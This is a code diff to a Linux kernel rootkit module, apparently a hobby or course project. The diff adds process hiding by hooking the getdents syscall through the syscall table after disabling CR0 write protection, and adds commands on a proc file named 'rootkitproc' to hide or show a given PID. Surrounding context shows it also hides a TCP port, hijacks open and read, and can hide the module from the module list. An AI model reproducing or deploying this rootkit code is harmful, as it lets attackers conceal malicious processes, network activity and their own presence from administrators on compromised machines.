@@ -17,26 +17,175 @@
 #include <linux/syscalls.h>
 #include <linux/types.h>
 #include <linux/unistd.h>
+#include <linux/fdtable.h>
 
 MODULE_LICENSE("GPL");
-
 #define BUF_SIZE 1024
 #define END_MEM  ULLONG_MAX
 #define START_MEM   PAGE_OFFSET
 #define TCP_LINE_SIZE 150
 #define END_MEM     ULLONG_MAX
 #define PROC_FILE_NAME "rootkitproc"
+#define HIDE_PROC_CMD   "hide_proc"
+#define SHOW_PROC_CMD   "show_proc"
 
+long proc_pid;
+bool proc_hidden = false;
 int PORT_TO_HIDE = 631;
 int TCP_fd = -10;
 static struct proc_dir_entry *proc_file;
 static unsigned long procfs_buffer_size = 0;
 struct list_head *prev_module;
 unsigned long long *syscall_table;
+static char buff1[BUF_SIZE];
+static char buff2[BUF_SIZE];
 
 // original functions
 asmlinkage int (*original_open)(const char *, int);
 asmlinkage long (*original_read)(int, char __user *, size_t);
+asmlinkage int (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int);
+
+struct linux_dirent {
+  unsigned long d_ino;
+  unsigned long d_off;
+  unsigned short d_reclen;
+  char d_name[256];
+  char pad;
+  char d_type;
+};
+
+void enable_write_protection(void) {
+  write_cr0 (read_cr0 () | 0x10000);
+  return;
+}
+
+void disable_write_protection(void) {
+  write_cr0 (read_cr0 () & (~ 0x10000));
+  return;
+}
+
+long str_to_lng(const char *str)
+{
+  long res = 0, mul = 1;
+  const char *ptr;
+  
+  for(ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++);
+    ptr--;
+
+  while(ptr >= str) {
+    if(*ptr < '0' || *ptr > '9')
+      break;
+
+    res += (*ptr - '0') * mul;
+    mul *= 10;
+    ptr--;  
+  }
+  return res;
+}
+
+// splits the input into 2 commands
+void split_buffer(char* procfs_buffer)
+{ 
+  int i,j;
+  bool flag = true;
+  
+  for(i = 0; i < BUF_SIZE; i++)
+  {
+    if(procfs_buffer[i] == ' ' || procfs_buffer[i] == '\n')
+    {
+      buff1[i++] = '\0';
+      if(procfs_buffer[i] == '\n') flag = false;
+      break;
+    }
+
+    buff1[i] = procfs_buffer[i];
+  }
+
+  if(!flag) return;
+  
+  for(j = 0; j < BUF_SIZE && i < BUF_SIZE; i++, j++)
+  {
+    if(procfs_buffer[i] == '\n')
+    { 
+      buff2[i] = '\0';
+      break;
+    }
+
+    buff2[j] = procfs_buffer[i];
+  }
+}
+
+asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+{
+  int result, bp;
+  char *kdirp;
+  struct linux_dirent *d;
+
+  struct files_struct *current_files;
+  struct fdtable *files_table;
+  struct path file_path;
+  char pbuf[256], *pathname = NULL;
+  long pid = 0;
+
+  // run real getdents
+  result = (*orig_getdents)(fd,dirp,count);
+  if (result <= 0)
+    return result;
+  
+  // get pathname
+  current_files = current->files;
+  files_table = files_fdtable(current_files);
+
+  file_path = files_table->fd[fd]->f_path;
+  pathname = d_path(&file_path,pbuf,256 * sizeof(char));
+
+  // copy from user to kernelspace;
+  if (!access_ok(VERIFY_READ,dirp,result))
+    return EFAULT;
+  if ((kdirp = kmalloc(result,GFP_KERNEL)) == NULL)
+    return EINVAL;
+  if (copy_from_user(kdirp,dirp,result))
+    return EFAULT;
+
+  // check dirp for files to hide
+  for (bp = 0; bp < result; bp += d->d_reclen) {
+    d = (struct linux_dirent *) (kdirp + bp);
+    // process hiding
+    if (!strcmp(pathname,"/proc")) {
+      pid = str_to_lng(d->d_name); // convert string into long
+      if (pid == proc_pid) {
+        // shifting memory by record length to hide traces of the pid if it matched the current record
+        memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+        result - bp - d->d_reclen);
+        result -= d->d_reclen;
+        bp -= d->d_reclen;
+      }
+    }
+  }
+
+  // copy from kernel to userspace
+  if (!access_ok(VERIFY_WRITE,dirp,result))
+    return EFAULT;
+  if (copy_to_user(dirp,kdirp,result))
+    return EFAULT;
+  kfree(kdirp);
+
+  // return number of bytes read
+  return result;
+}
+
+// replaces getdents original address with hacked routine and saves the original address of getdents
+void hack_getdents(void)
+{
+  orig_getdents = syscall_table[__NR_getdents];
+  syscall_table[__NR_getdents] = hacked_getdents;
+}
+
+// restores the original address of getdents
+void restore_getdents(void)
+{
+  syscall_table[__NR_getdents] = orig_getdents;
+}
 
 // hijacked open function
 asmlinkage int new_open(const char* path_name, int flags) {
@@ -54,6 +203,7 @@ asmlinkage long new_read(int fd, char __user *buf, size_t count) {
   long ret, temp;
   long i = 0;
   char * kernel_buf;
+
   ret = original_read(fd, buf, count);
   if (fd != TCP_fd)
     return ret;
@@ -106,10 +256,39 @@ int procfile_write(struct file *file, const char *buf, unsigned long count, void
   bool temp = 0;
   unsigned long j = 0;
   int c;
+
+  split_buffer(buf);
   if (!kernel_buf || copy_from_user(kernel_buf, buf, count)) {
     printk("FAILLLLLLED KERNEL PROBLEM\n");
     return count;
   }
+
+  if (strncmp(HIDE_PROC_CMD, buff1, 9) == 0)
+  {
+    proc_pid = str_to_lng(buff2);
+    printk("HIDING PID %lld\n", proc_pid);
+    if(!proc_hidden){
+      disable_write_protection();
+      hack_getdents();
+      enable_write_protection();
+      proc_hidden = true;
+    } 
+    return count;
+  }
+
+  else if (strncmp(SHOW_PROC_CMD, buff1, 9) == 0)
+  {
+    proc_pid = str_to_lng(buff2);
+    printk("SHOWING PID %lld\n", proc_pid);
+    if(proc_hidden){
+      disable_write_protection();
+      restore_getdents();
+      enable_write_protection();
+      proc_hidden = false;
+    }
+    return count;
+  }
+
   // hp port number decimal value
   if (kernel_buf[0] == 'h' &&  kernel_buf[1] == 'p') {
     PORT_TO_HIDE = 0;
@@ -150,11 +329,6 @@ unsigned long **find(void) {
   return NULL;
 }
 
-void disable_write_protection(void) {
-  write_cr0 (read_cr0 () & (~ 0x10000));
-  return;
-}
-
 void hide_module(void) {
   prev_module = THIS_MODULE->list.prev;
 
@@ -186,13 +360,8 @@ void show_module(void) {
   mutex_unlock(&module_mutex);
 }
 
-void enable_write_protection(void) {
-  write_cr0 (read_cr0 () | 0x10000);
-  return;
-}
-
 static int init(void) {
-  hide_module();
+  // hide_module();
   printk("\nModule starting...\n");
   syscall_table = (unsigned long long*) find();
   if ( syscall_table != NULL ) {
